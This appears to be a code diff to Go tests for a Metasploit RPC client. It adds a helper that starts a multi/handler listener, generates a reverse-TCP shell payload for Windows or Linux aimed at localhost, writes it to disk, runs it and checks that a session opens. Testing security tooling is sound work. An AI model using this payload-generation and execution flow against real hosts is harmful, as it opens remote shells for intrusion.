@@ -3,10 +3,12 @@ package msfrpc
 import (
 	"bytes"
 	"context"
+	"fmt"
 	"io"
 	"io/ioutil"
 	"net/http"
 	"os"
+	"os/exec"
 	"runtime"
 	"strconv"
 	"strings"
@@ -309,6 +311,89 @@ func TestMSFRPC_SessionWrite(t *testing.T) {
 	testsuite.IsDestroyed(t, msfrpc)
 }
 
+// testCreateShellSessionWithProgram will return file path and session id.
+func testCreateShellSessionWithProgram(t *testing.T, msfrpc *MSFRPC, port string) (string, uint64) {
+	ctx := context.Background()
+
+	// select payload
+	opts := make(map[string]interface{})
+	payloadOpts := NewModuleExecuteOptions()
+	switch runtime.GOOS {
+	case "windows":
+		payloadOpts.Format = "exe"
+		switch runtime.GOARCH {
+		case "386":
+			opts["PAYLOAD"] = "windows/shell/reverse_tcp"
+			payloadOpts.Template = TemplateX86WindowsEXE
+		case "amd64":
+			opts["PAYLOAD"] = "windows/x64/shell/reverse_tcp"
+			payloadOpts.Template = TemplateX64WindowsEXE
+		default:
+			t.Skip("only support 386 and amd64")
+		}
+	case "linux":
+		payloadOpts.Format = "elf"
+		switch runtime.GOARCH {
+		case "386":
+			opts["PAYLOAD"] = "linux/shell/reverse_tcp"
+			payloadOpts.Template = TemplateX86LinuxELF
+		case "amd64":
+			opts["PAYLOAD"] = "linux/x64/shell/reverse_tcp"
+			payloadOpts.Template = TemplateX64LinuxELF
+		default:
+			t.Skip("only support 386 and amd64")
+		}
+	default:
+		t.Skip("only support windows and linux")
+	}
+	// handler
+	opts["TARGET"] = 0
+	opts["ExitOnSession"] = false
+	// payload
+	opts["LHOST"] = "127.0.0.1"
+	opts["LPORT"] = port
+	opts["EXITFUNC"] = "thread"
+
+	// start handler
+	mResult, err := msfrpc.ModuleExecute(ctx, "exploit", "multi/handler", opts)
+	require.NoError(t, err)
+	defer func() {
+		jobID := strconv.FormatUint(mResult.JobID, 10)
+		err = msfrpc.JobStop(ctx, jobID)
+		require.NoError(t, err)
+	}()
+
+	// generate executable file
+	payloadOpts.DataStore["EXITFUNC"] = "thread"
+	payloadOpts.DataStore["LHOST"] = "127.0.0.1"
+	payloadOpts.DataStore["LPORT"] = port
+
+	payload := opts["PAYLOAD"].(string)
+	pResult, err := msfrpc.ModuleExecute(ctx, "payload", payload, payloadOpts)
+	require.NoError(t, err)
+	sc := []byte(pResult.Payload)
+
+	// save
+	name := strings.ReplaceAll(t.Name(), "/", "_")
+	file := "../temp/test/msfrpc_" + name + "." + payloadOpts.Format
+	err = ioutil.WriteFile(file, sc, 0600)
+	require.NoError(t, err)
+
+	// run
+	err = exec.Command(file).Start()
+	require.NoError(t, err)
+	time.Sleep(5 * time.Second)
+
+	// check session number
+	sessions, err := msfrpc.SessionList(ctx)
+	require.NoError(t, err)
+	require.Len(t, sessions, 1)
+	for id := range sessions {
+		return file, id
+	}
+	return file, 0
+}
+
 func TestMSFRPC_SessionUpgrade(t *testing.T) {
 	gm := testsuite.MarkGoroutines(t)
 	defer gm.Compare()
@@ -321,7 +406,11 @@ func TestMSFRPC_SessionUpgrade(t *testing.T) {
 	ctx := context.Background()
 
 	t.Run("success", func(t *testing.T) {
-		id := testCreateShellSession(t, msfrpc, "55005")
+		file, id := testCreateShellSessionWithProgram(t, msfrpc, "55005")
+		defer func() {
+			err = os.Remove(file)
+			require.NoError(t, err)
+		}()
 
 		const (
 			host = "127.0.0.1"
@@ -383,7 +472,7 @@ func TestMSFRPC_SessionUpgrade(t *testing.T) {
 		require.Nil(t, result)
 	})
 
-	id := testCreateShellSession(t, msfrpc, "55006")
+	file, id := testCreateShellSessionWithProgram(t, msfrpc, "55006")
 	defer func() {
 		// kill session(need create a new msfrpc client)
 		msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
@@ -392,6 +481,12 @@ func TestMSFRPC_SessionUpgrade(t *testing.T) {
 		require.NoError(t, err)
 
 		err = msfrpc.SessionStop(ctx, id)
+		require.NoError(t, err)
+
+		// wait program exit
+		time.Sleep(time.Second)
+
+		err = os.Remove(file)
 		require.NoError(t, err)
 
 		msfrpc.Kill()
@@ -789,12 +884,15 @@ func TestMSFRPC_SessionCompatibleModules(t *testing.T) {
 	testsuite.IsDestroyed(t, msfrpc)
 }
 
-// if print buf, program will crash, so we write to file.
 func testSessionPrintOutput(t *testing.T, buf *bytes.Buffer) {
 	_ = os.Mkdir("../temp", 0750)
 	_ = os.Mkdir("../temp/test", 0750)
 	name := strings.ReplaceAll(t.Name(), "/", "_")
 	file := "../temp/test/msfrpc_" + name + ".log"
+	// if print output, Goland will crash(test), so we write to file.
+	if !testsuite.InGoland {
+		fmt.Println(buf)
+	}
 	err := ioutil.WriteFile(file, buf.Bytes(), 0600)
 	require.NoError(t, err)
 }
